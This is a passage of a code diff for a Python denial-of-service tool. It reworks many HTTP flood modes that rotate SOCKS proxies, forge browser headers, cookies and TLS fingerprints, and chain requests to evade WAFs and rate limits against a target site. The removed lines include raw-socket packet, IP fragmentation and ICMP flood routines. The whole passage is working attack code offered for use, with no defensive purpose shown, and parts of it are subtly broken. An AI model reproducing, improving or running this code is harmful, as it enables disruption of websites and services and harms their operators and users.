@@ -4,7 +4,6 @@ import random
 import uuid
 import time
 import aiohttp
-import httpx
 import socket
 import json
 import base64
@@ -17,15 +16,19 @@ from rich.live import Live
 from rich.table import Table
 from rich.console import Console
 from urllib.parse import urlparse
+from aiohttp_socks import ProxyConnector
+import httpx
+import re
 
 init(autoreset=True)
 
 # Internal list of user-agents for faster performance
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
-    # Tambahkan 1000+ user-agent real jika perlu
-]
+USER_AGENTS = []
+try:
+    with open("ua_real_dump.txt") as f:
+        USER_AGENTS = [line.strip() for line in f if line.strip()]
+except FileNotFoundError:
+    USER_AGENTS = ["Mozilla/5.0"]  # fallback
 
 def generate_user_agent():
     return random.choice(USER_AGENTS)
@@ -54,6 +57,23 @@ def generate_headers(target, profile=None):
 
     headers = random.choice(header_presets)()
     headers = mutate_headers(headers, target)
+    headers["Referer"] = random.choice([
+        "https://google.com/search?q=" + uuid.uuid4().hex,
+        "https://news.ycombinator.com/",
+        f"{target}/docs",
+        f"{target}/login"
+    ])
+    headers.update({
+        "Sec-CH-UA": '"Chromium";v="114", "Not.A/Brand";v="8"',
+        "Sec-CH-UA-Mobile": "?0",
+        "Sec-CH-UA-Platform": '"Windows"',
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-User": "?1"
+    })
+    headers["Cookie"] = f"_vercel_jwt={uuid.uuid4().hex}; session={uuid.uuid4().hex}"
     if profile:
         if profile == "seo":
             headers['User-Agent'] = "Googlebot/2.1"
@@ -93,38 +113,44 @@ async def detect_waf(session, url):
 # Function to validate proxies
 async def validate_proxy(proxy):
     try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get("http://httpbin.org/ip", proxy=proxy, timeout=5) as res:
+        connector = ProxyConnector.from_url(proxy)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            async with session.get("http://httpbin.org/ip", timeout=5) as res:
                 return res.status == 200
     except:
         return False
 
 # TLS Spoofing Function (Synchronous)
-def tls_spoof_post_sync(url, headers, data):
-    session = Session(client_identifier="chrome_112")
+def tls_spoof_post_sync(url, headers, data, target):
+    session = get_random_tls_session(target)
     session.headers.update(headers)
     return session.post(url, data=data)
 
 # TLS Spoofing Function (Asynchronous)
-async def tls_spoof_post(url, headers, data, client_identifier="chrome_112"):
-    async with httpx.AsyncClient(verify=False, transport=custom_tls) as client:
-        response = await client.post(url, headers=headers, data=data)
-        return response
+async def tls_spoof_post(url, headers, data, target):
+    loop = asyncio.get_running_loop()
+    return await loop.run_in_executor(None, partial(tls_spoof_post_sync, url, headers, data, target))
 
 # Obfuscated Payload for Ghost Attack
-def ghost_obfuscate_payload():
-    raw = json.dumps({
-        random.choice(['token','uid','auth']): uuid.uuid4().hex,
-        "b64": base64.b64encode(uuid.uuid4().bytes).decode()
+def nextjs_payload():
+    return json.dumps({
+        "__N_SSG": True,
+        "props": {
+            "pageProps": {
+                "auth": uuid.uuid4().hex,
+                "locale": random.choice(["en", "fr", "es"]),
+                "config": {"id": uuid.uuid4().hex}
+            }
+        }
     })
-    return raw
 
 # Safe POST request with retry logic
 async def safe_post(session, url, **kwargs):
     retry_queue = asyncio.Queue()
     for _ in range(3):
         try:
-            return await session.post(url, **kwargs)
+            response = await session.post(url, **kwargs)
+            return response
         except:
             await retry_queue.put((url, kwargs))
             await asyncio.sleep(0.2)
@@ -135,1009 +161,872 @@ async def safe_post(session, url, **kwargs):
         except:
             pass
 
+# Prewarming Fingerprint
+async def prewarm_fingerprint(session, target):
+    try:
+        await session.get(f"{target}/favicon.ico")
+        await session.get(f"{target}/_next/static/chunks/main.js")
+        await session.get(f"{target}/robots.txt")
+    except:
+        pass
+
 # Smart Flood Mutation
 async def smart_flood_mutation(target, proxies, threads, use_tls=False):
-    async with aiohttp.ClientSession() as session:
-        def generate_payload():
-            keys = ['param', 'data', 'info', 'token', 'ref', 'uid']
-            key = random.choice(keys)
-            return f'{{"{key}": "{uuid.uuid4()}"}}'
+    random.shuffle(proxies)
+    tasks = []
+    for _ in range(threads):
+        task = asyncio.create_task(http_flood(target, proxies, use_tls))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
 
-        async def http_flood():
-            global total_requests
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
-                        break
-                if not proxy:
-                    continue  # skip iteration
-                headers = generate_headers(target)
-                data = generate_payload()
-                try:
-                    start = time.time()
-                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
-                        status_code = post_response.status
-                        latency = round((time.time() - start) * 1000)
-                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                        if status_code == 403:
-                            # Change User-Agent and payload parameters
-                            headers['User-Agent'] = generate_user_agent()
-                            data = json.dumps({'new_param': uuid.uuid4().hex})
-                        elif status_code == 503:
-                            # Retry and drop body
-                            await asyncio.sleep(random.uniform(1, 5))
-                            data = ''
-                        elif status_code == 200:
-                            # Increase rate and chain JSON
-                            await asyncio.sleep(random.uniform(0.1, 0.5))
-                            data = json.dumps({'chain': [data, {'extra': uuid.uuid4().hex}]})
-                        if status_code < 400:
-                            global proxy_success
-                            proxy_success += 1
-                        else:
-                            global proxy_fail
-                            proxy_fail += 1
-                        total_requests += 1
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
+async def http_flood(target, proxies, use_tls):
+    global total_requests, proxy_success, proxy_fail
+    while True:
+        proxy_url = random.choice(proxies)
+        connector = ProxyConnector.from_url(proxy_url)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            headers = generate_headers(target)
+            data = nextjs_payload()
+            start = time.time()
+            try:
+                async with safe_post(session, target, headers=headers, data=data) as post_response:
+                    status_code = post_response.status
+                    latency = round((time.time() - start) * 1000)
+                    print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
+                    if status_code < 400:
+                        proxy_success += 1
+                    else:
+                        proxy_fail += 1
+                    total_requests += 1
+                    if latency > 500 or status_code in (403, 429):
+                        if proxy_url in proxies and len(proxies) > 3:
+                            proxies.remove(proxy_url)
+            except Exception as e:
+                print(f"[red]Error: {str(e)}")
 
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
-
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
+            await asyncio.sleep(smart_jitter())
 
 # Exploit-aware Chaining Mode
 async def exploit_chaining_mode(target, proxies, threads, use_tls=False):
-    async with aiohttp.ClientSession() as session:
-        def generate_payload():
-            return json.dumps({'key': uuid.uuid4().hex})
+    random.shuffle(proxies)
+    tasks = []
+    for _ in range(threads):
+        task = asyncio.create_task(http_flood_exploit(target, proxies, use_tls))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
 
-        async def http_flood():
-            global total_requests
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
-                        break
-                if not proxy:
-                    continue  # skip iteration
-                headers = generate_headers(target)
-                data = generate_payload()
-                try:
-                    # Stage 1: POST login
-                    async with safe_post(session, f"{target}/login", headers=headers, data=data, proxy=proxy) as login_response:
-                        if login_response.status != 200:
-                            continue
-                        # Stage 2: PUT /config/update
-                        async with safe_post(session, f"{target}/config/update", headers=headers, data=data, proxy=proxy, method='PUT') as put_response:
-                            if put_response.status != 200:
-                                continue
-                        # Stage 3: GET /admin/logs
-                        async with session.get(f"{target}/admin/logs", headers=headers, proxy=proxy) as get_response:
-                            status_code = get_response.status
-                            latency = round((time.time() - start) * 1000)
-                            print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                            if status_code < 400:
-                                global proxy_success
-                                proxy_success += 1
-                            else:
-                                global proxy_fail
-                                proxy_fail += 1
-                            total_requests += 1
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
+async def http_flood_exploit(target, proxies, use_tls):
+    global total_requests, proxy_success, proxy_fail
+    while True:
+        proxy_url = random.choice(proxies)
+        connector = ProxyConnector.from_url(proxy_url)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            headers = generate_headers(target)
+            data = nextjs_payload()
+            start = time.time()
+            try:
+                await flood_chain(session, target, headers)
+                status_code = 200  # Assume success for chained requests
+                latency = round((time.time() - start) * 1000)
+                print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
+                if status_code < 400:
+                    proxy_success += 1
+                else:
+                    proxy_fail += 1
+                total_requests += 1
+                if latency > 500 or status_code in (403, 429):
+                    if proxy_url in proxies and len(proxies) > 3:
+                        proxies.remove(proxy_url)
+            except Exception as e:
+                print(f"[red]Error: {str(e)}")
 
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
+            await asyncio.sleep(smart_jitter())
 
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
+async def flood_chain(session, target, headers):
+    await session.get(f"{target}/api/preview?id={uuid.uuid4().hex}", headers=headers)
+    await session.post(f"{target}/api/feedback", headers=headers, data=nextjs_payload())
+    await session.get(f"{target}/_next/data/{uuid.uuid4().hex}.json?page=home", headers=headers)
 
 # Adaptive Ghost Mutation Engine
 async def adaptive_ghost_mutation(target, proxies, threads, use_tls=False):
-    async with aiohttp.ClientSession() as session:
-        def generate_payload():
-            return json.dumps({'key': uuid.uuid4().hex})
+    random.shuffle(proxies)
+    tasks = []
+    for _ in range(threads):
+        task = asyncio.create_task(http_flood_adaptive(target, proxies, use_tls))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
 
-        async def http_flood():
-            global total_requests
-            request_count = 0
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
-                        break
-                if not proxy:
-                    continue  # skip iteration
-                headers = generate_headers(target)
-                data = generate_payload()
-                try:
-                    start = time.time()
-                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
-                        status_code = post_response.status
-                        latency = round((time.time() - start) * 1000)
-                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                        if status_code < 400:
-                            global proxy_success
-                            proxy_success += 1
-                        else:
-                            global proxy_fail
-                            proxy_fail += 1
-                        total_requests += 1
-                        request_count += 1
-                        if request_count % 5 == 0:
-                            # Re-encode payload every 5 requests
-                            data = base64.b64encode(data.encode()).decode()
-                            data = json.dumps({'nested': data})
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
+async def http_flood_adaptive(target, proxies, use_tls):
+    global total_requests, proxy_success, proxy_fail
+    request_count = 0
+    while True:
+        proxy_url = random.choice(proxies)
+        connector = ProxyConnector.from_url(proxy_url)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            headers = generate_headers(target)
+            data = nextjs_payload()
+            start = time.time()
+            try:
+                async with safe_post(session, target, headers=headers, data=data) as post_response:
+                    status_code = post_response.status
+                    latency = round((time.time() - start) * 1000)
+                    print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
+                    if status_code < 400:
+                        proxy_success += 1
+                    else:
+                        proxy_fail += 1
+                    total_requests += 1
+                    request_count += 1
+                    if request_count % 5 == 0:
+                        data = base64.b64encode(data.encode()).decode()
+                        data = json.dumps({'nested': data})
+                    if latency > 500 or status_code in (403, 429):
+                        if proxy_url in proxies and len(proxies) > 3:
+                            proxies.remove(proxy_url)
+            except Exception as e:
+                print(f"[red]Error: {str(e)}")
 
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
-
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
+            await asyncio.sleep(smart_jitter())
 
 # AI-Bypass Header Synthesis
 async def ai_bypass_header_synthesis(target, proxies, threads, use_tls=False):
-    async with aiohttp.ClientSession() as session:
-        def generate_payload():
-            return json.dumps({'key': uuid.uuid4().hex})
+    random.shuffle(proxies)
+    tasks = []
+    for _ in range(threads):
+        task = asyncio.create_task(http_flood_ai_bypass(target, proxies, use_tls))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
 
-        async def http_flood():
-            global total_requests
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
-                        break
-                if not proxy:
-                    continue  # skip iteration
-                headers = generate_headers(target)
-                data = generate_payload()
-                try:
-                    # Randomize headers
-                    headers['User-Agent'] = random.choice(USER_AGENTS)
-                    headers['Accept-Language'] = random.choice(['en-US', 'fr-FR', 'es-ES'])
-                    headers['Sec-Fetch-Site'] = random.choice(['none', 'same-origin', 'same-site'])
-                    headers['Sec-Fetch-Mode'] = random.choice(['navigate', 'same-origin', 'no-cors', 'cors'])
-                    headers['Sec-Fetch-Dest'] = random.choice(['document', 'empty', 'image', 'script', 'style', 'font', 'report', 'object', 'embed'])
-                    start = time.time()
-                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
-                        status_code = post_response.status
-                        latency = round((time.time() - start) * 1000)
-                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                        if status_code < 400:
-                            global proxy_success
-                            proxy_success += 1
-                        else:
-                            global proxy_fail
-                            proxy_fail += 1
-                        total_requests += 1
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
+async def http_flood_ai_bypass(target, proxies, use_tls):
+    global total_requests, proxy_success, proxy_fail
+    while True:
+        proxy_url = random.choice(proxies)
+        connector = ProxyConnector.from_url(proxy_url)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            headers = generate_headers(target)
+            data = nextjs_payload()
+            start = time.time()
+            try:
+                headers['User-Agent'] = random.choice(USER_AGENTS)
+                headers['Accept-Language'] = random.choice(['en-US', 'fr-FR', 'es-ES'])
+                headers['Sec-Fetch-Site'] = random.choice(['none', 'same-origin', 'same-site'])
+                headers['Sec-Fetch-Mode'] = random.choice(['navigate', 'same-origin', 'no-cors', 'cors'])
+                headers['Sec-Fetch-Dest'] = random.choice(['document', 'empty', 'image', 'script', 'style', 'font', 'report', 'object', 'embed'])
+                async with safe_post(session, target, headers=headers, data=data) as post_response:
+                    status_code = post_response.status
+                    latency = round((time.time() - start) * 1000)
+                    print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
+                    if status_code < 400:
+                        proxy_success += 1
+                    else:
+                        proxy_fail += 1
+                    total_requests += 1
+                    if latency > 500 or status_code in (403, 429):
+                        if proxy_url in proxies and len(proxies) > 3:
+                            proxies.remove(proxy_url)
+            except Exception as e:
+                print(f"[red]Error: {str(e)}")
 
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
-
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
+            await asyncio.sleep(smart_jitter())
 
 # Real-Time Fingerprint Spoofer (TLS + JA3)
 async def tls_fingerprint_rotate(target, proxies, threads, use_tls=False):
-    async with aiohttp.ClientSession() as session:
-        def generate_payload():
-            return json.dumps({'key': uuid.uuid4().hex})
+    random.shuffle(proxies)
+    tasks = []
+    for _ in range(threads):
+        task = asyncio.create_task(http_flood_tls_fingerprint(target, proxies, use_tls))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
 
-        async def http_flood():
-            global total_requests
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
-                        break
-                if not proxy:
-                    continue  # skip iteration
-                headers = generate_headers(target)
-                data = generate_payload()
-                try:
-                    # Rotate JA3 fingerprint
-                    client_identifiers = ["chrome_112", "firefox_109", "safari_16", "edge_110"]
-                    client_identifier = random.choice(client_identifiers)
-                    async with tls_spoof_post(target, headers, data, client_identifier=client_identifier) as post_response:
-                        status_code = post_response.status
-                        latency = round((time.time() - start) * 1000)
-                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                        if status_code < 400:
-                            global proxy_success
-                            proxy_success += 1
-                        else:
-                            global proxy_fail
-                            proxy_fail += 1
-                        total_requests += 1
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
+async def http_flood_tls_fingerprint(target, proxies, use_tls):
+    global total_requests, proxy_success, proxy_fail
+    while True:
+        proxy_url = random.choice(proxies)
+        connector = ProxyConnector.from_url(proxy_url)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            headers = generate_headers(target)
+            data = nextjs_payload()
+            start = time.time()
+            try:
+                client_identifiers = ["chrome_112", "firefox_109", "safari_16", "edge_109"]
+                client_identifier = random.choice(client_identifiers)
+                resp = await tls_spoof_post(target, headers, data, target)
+                status_code = resp.status_code
+                latency = round((time.time() - start) * 1000)
+                print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
+                if status_code < 400:
+                    proxy_success += 1
+                else:
+                    proxy_fail += 1
+                total_requests += 1
+                if latency > 500 or status_code in (403, 429):
+                    if proxy_url in proxies and len(proxies) > 3:
+                        proxies.remove(proxy_url)
+            except Exception as e:
+                print(f"[red]Error: {str(e)}")
 
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
-
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
+            await asyncio.sleep(smart_jitter())
 
 # Proxy Score Autobalancer
 async def proxy_score_autobalancer(target, proxies, threads, use_tls=False):
-    async with aiohttp.ClientSession() as session:
-        def generate_payload():
-            return json.dumps({'key': uuid.uuid4().hex})
+    random.shuffle(proxies)
+    tasks = []
+    for _ in range(threads):
+        task = asyncio.create_task(http_flood_proxy_balancer(target, proxies, use_tls))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
 
-        async def http_flood():
-            global total_requests
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
-                        break
-                if not proxy:
-                    continue  # skip iteration
-                headers = generate_headers(target)
-                data = generate_payload()
-                try:
-                    start = time.time()
-                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
-                        status_code = post_response.status
-                        latency = round((time.time() - start) * 1000)
-                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                        if status_code < 400:
-                            global proxy_success
-                            proxy_success += 1
-                        else:
-                            global proxy_fail
-                            proxy_fail += 1
-                        total_requests += 1
-                        # Adjust intensity based on proxy performance
-                        if latency > 500:
-                            threads -= 1
-                        else:
-                            threads += 1
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
+async def http_flood_proxy_balancer(target, proxies, use_tls):
+    global total_requests, proxy_success, proxy_fail
+    while True:
+        proxy_url = random.choice(proxies)
+        connector = ProxyConnector.from_url(proxy_url)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            headers = generate_headers(target)
+            data = nextjs_payload()
+            start = time.time()
+            try:
+                async with safe_post(session, target, headers=headers, data=data) as post_response:
+                    status_code = post_response.status
+                    latency = round((time.time() - start) * 1000)
+                    print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
+                    if status_code < 400:
+                        proxy_success += 1
+                    else:
+                        proxy_fail += 1
+                    total_requests += 1
+                    if latency > 500:
+                        threads -= 1
+                    else:
+                        threads += 1
+                    if latency > 500 or status_code in (403, 429):
+                        if proxy_url in proxies and len(proxies) > 3:
+                            proxies.remove(proxy_url)
+            except Exception as e:
+                print(f"[red]Error: {str(e)}")
 
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
-
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
+            await asyncio.sleep(smart_jitter())
 
 # WAF Reaction Simulator
 async def waf_reaction_simulator(target, proxies, threads, use_tls=False):
-    async with aiohttp.ClientSession() as session:
-        def generate_payload():
-            return json.dumps({'key': uuid.uuid4().hex})
+    random.shuffle(proxies)
+    tasks = []
+    for _ in range(threads):
+        task = asyncio.create_task(http_flood_waf_simulator(target, proxies, use_tls))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
 
-        async def http_flood():
-            global total_requests
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
-                        break
-                if not proxy:
-                    continue  # skip iteration
-                headers = generate_headers(target)
-                data = generate_payload()
-                try:
-                    start = time.time()
-                    # Simulate OPTIONS, HEAD, POST chain
-                    async with session.options(target, headers=headers, proxy=proxy) as options_response:
-                        if options_response.status != 200:
-                            continue
-                    async with session.head(target, headers=headers, proxy=proxy) as head_response:
-                        if head_response.status != 200:
-                            continue
-                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
-                        status_code = post_response.status
-                        latency = round((time.time() - start) * 1000)
-                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                        if status_code < 400:
-                            global proxy_success
-                            proxy_success += 1
-                        else:
-                            global proxy_fail
-                            proxy_fail += 1
-                        total_requests += 1
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
+async def http_flood_waf_simulator(target, proxies, use_tls):
+    global total_requests, proxy_success, proxy_fail
+    while True:
+        proxy_url = random.choice(proxies)
+        connector = ProxyConnector.from_url(proxy_url)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            headers = generate_headers(target)
+            data = nextjs_payload()
+            start = time.time()
+            try:
+                async with session.options(target, headers=headers) as options_response:
+                    if options_response.status != 200:
+                        continue
+                async with session.head(target, headers=headers) as head_response:
+                    if head_response.status != 200:
+                        continue
+                async with safe_post(session, target, headers=headers, data=data) as post_response:
+                    status_code = post_response.status
+                    latency = round((time.time() - start) * 1000)
+                    print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
+                    if status_code < 400:
+                        proxy_success += 1
+                    else:
+                        proxy_fail += 1
+                    total_requests += 1
+                    if latency > 500 or status_code in (403, 429):
+                        if proxy_url in proxies and len(proxies) > 3:
+                            proxies.remove(proxy_url)
+            except Exception as e:
+                print(f"[red]Error: {str(e)}")
 
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
-
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
+            await asyncio.sleep(smart_jitter())
 
 # Attack Log Replay
 async def attack_log_replay(target, proxies, threads, use_tls, replay_mode):
-    async with aiohttp.ClientSession() as session:
-        def load_logged_payloads(file_path):
-            with open(file_path, 'r') as file:
-                return [json.loads(line) for line in file]
-
-        logged_payloads = load_logged_payloads('successful_payloads.log')
-
-        async def http_flood():
-            global total_requests
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
-                        break
-                if not proxy:
-                    continue  # skip iteration
-                payload = random.choice(logged_payloads)
-                headers = generate_headers(target)
-                data = payload['data']
-                try:
-                    start = time.time()
-                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
-                        status_code = post_response.status
-                        latency = round((time.time() - start) * 1000)
-                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                        if status_code < 400:
-                            global proxy_success
-                            proxy_success += 1
-                        else:
-                            global proxy_fail
-                            proxy_fail += 1
-                        total_requests += 1
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
-
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
-
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
-
-# Timed Chainer
-async def timed_chainer(target, proxies, threads, use_tls=False):
-    async with aiohttp.ClientSession() as session:
-        def generate_payload():
-            return json.dumps({'key': uuid.uuid4().hex})
-
-        async def http_flood():
-            global total_requests
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
-                        break
-                if not proxy:
-                    continue  # skip iteration
-                headers = generate_headers(target)
-                data = generate_payload()
-                try:
-                    start = time.time()
-                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
-                        status_code = post_response.status
-                        latency = round((time.time() - start) * 1000)
-                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                        if status_code < 400:
-                            global proxy_success
-                            proxy_success += 1
-                        else:
-                            global proxy_fail
-                            proxy_fail += 1
-                        total_requests += 1
-                        # Chain requests based on time intervals
-                        await asyncio.sleep(random.uniform(0.1, 0.5))
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
-
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
-
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
-
-# L7L4 Blend
-async def l7l4_blend(target, proxies, threads, use_tls=False):
-    async with aiohttp.ClientSession() as session:
-        def generate_payload():
-            return json.dumps({'key': uuid.uuid4().hex})
-
-        async def http_flood():
-            global total_requests
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
-                        break
-                if not proxy:
-                    continue  # skip iteration
-                headers = generate_headers(target)
-                data = generate_payload()
-                try:
-                    start = time.time()
-                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
-                        status_code = post_response.status
-                        latency = round((time.time() - start) * 1000)
-                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                        if status_code < 400:
-                            global proxy_success
-                            proxy_success += 1
-                        else:
-                            global proxy_fail
-                            proxy_fail += 1
-                        total_requests += 1
-                        # Randomly inject raw packet flood
-                        if random.choice([True, False]):
-                            await raw_packet_flood(target, 10)
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
-
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
-
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
-
-# Raw Packet Flood (L3)
-async def raw_packet_flood(target, threads):
-    def generate_raw_packet():
-        ip_header = b'\x45\x00\x00\x28'  # IP header (example)
-        tcp_header = b'\x50\x00\x00\x00'  # TCP header (example)
-        payload = b'\x00' * 100  # Dummy payload
-        return ip_header + tcp_header + payload
-
-    async def flood():
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-        while True:
-            packet = generate_raw_packet()
-            sock.sendto(packet, (target, 0))
-            await asyncio.sleep(0.01)
-
-    tasks = [flood() for _ in range(threads)]
+    random.shuffle(proxies)
+    tasks = []
+    for _ in range(threads):
+        task = asyncio.create_task(http_flood_log_replay(target, proxies, use_tls, replay_mode))
+        tasks.append(task)
     await asyncio.gather(*tasks)
 
-# IP Fragmentation Exploit (L3)
-async def ip_fragmentation_exploit(target, threads):
-    def generate_fragmented_packet(offset):
-        ip_header = b'\x45\x00\x00\x28'  # IP header (example)
-        tcp_header = b'\x50\x00\x00\x00'  # TCP header (example)
-        payload = b'\x00' * 100  # Dummy payload
-        return ip_header + tcp_header + payload[offset:]
+async def http_flood_log_replay(target, proxies, use_tls, replay_mode):
+    global total_requests, proxy_success, proxy_fail
+    logged_payloads = load_logged_payloads('successful_payloads.log' if replay_mode == "successful" else 'failed_payloads.log')
+    while True:
+        proxy_url = random.choice(proxies)
+        connector = ProxyConnector.from_url(proxy_url)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            payload = random.choice(logged_payloads)
+            headers = generate_headers(target)
+            data = payload['data']
+            start = time.time()
+            try:
+                async with safe_post(session, target, headers=headers, data=data) as post_response:
+                    status_code = post_response.status
+                    latency = round((time.time() - start) * 1000)
+                    print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
+                    if status_code < 400:
+                        proxy_success += 1
+                    else:
+                        proxy_fail += 1
+                    total_requests += 1
+                    if latency > 500 or status_code in (403, 429):
+                        if proxy_url in proxies and len(proxies) > 3:
+                            proxies.remove(proxy_url)
+            except Exception as e:
+                print(f"[red]Error: {str(e)}")
 
-    async def flood():
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-        while True:
-            for offset in range(0, 100, 10):
-                packet = generate_fragmented_packet(offset)
-                sock.sendto(packet, (target, 0))
-                await asyncio.sleep(0.01)
+            await asyncio.sleep(smart_jitter())
 
-    tasks = [flood() for _ in range(threads)]
+# Stealth Resonance Mode
+async def stealth_resonance_flood(target, proxies, threads, use_tls):
+    random.shuffle(proxies)
+    tasks = []
+    for _ in range(threads):
+        task = asyncio.create_task(http_flood_stealth_resonance(target, proxies, use_tls))
+        tasks.append(task)
     await asyncio.gather(*tasks)
 
-# ICMP Fragment Flood (L3)
-async def icmp_fragment_flood(target, threads):
-    def generate_icmp_packet(offset):
-        icmp_header = b'\x08\x00' + (b'\x00' * 2)  # ICMP header (example)
-        payload = b'\x00' * 100  # Dummy payload
-        return icmp_header + payload[offset:]
+async def http_flood_stealth_resonance(target, proxies, use_tls):
+    global total_requests, proxy_success, proxy_fail
+    while True:
+        proxy_url = random.choice(proxies)
+        connector = ProxyConnector.from_url(proxy_url)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            headers = generate_headers(target)
+            data = nextjs_payload()
+            start = time.time()
+            try:
+                async with safe_post(session, target, headers=headers, data=data) as post_response:
+                    status_code = post_response.status
+                    latency = round((time.time() - start) * 1000)
+                    print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
+                    if status_code < 400:
+                        proxy_success += 1
+                    else:
+                        proxy_fail += 1
+                    total_requests += 1
+                    if latency > 500 or status_code in (403, 429):
+                        if proxy_url in proxies and len(proxies) > 3:
+                            proxies.remove(proxy_url)
+            except Exception as e:
+                print(f"[red]Error: {str(e)}")
 
-    async def flood():
